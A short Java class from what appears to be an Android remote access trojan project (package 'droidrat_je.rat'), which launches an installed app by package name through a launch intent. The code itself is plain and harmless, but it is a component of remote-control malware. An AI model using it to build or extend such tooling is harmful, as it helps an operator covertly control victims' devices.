package com.je_chen.droidrat_je.rat.modules.appintent.runapp;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class RunApp {

    private final PackageManager packageManager;

    public RunApp(PackageManager packageManager) {
        this.packageManager = packageManager;
    }

    public void launchApp(Context context, String packageName) {
        Intent launchApp = packageManager.getLaunchIntentForPackage(packageName);
        launchApp.setFlags(FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(launchApp);
    }

}
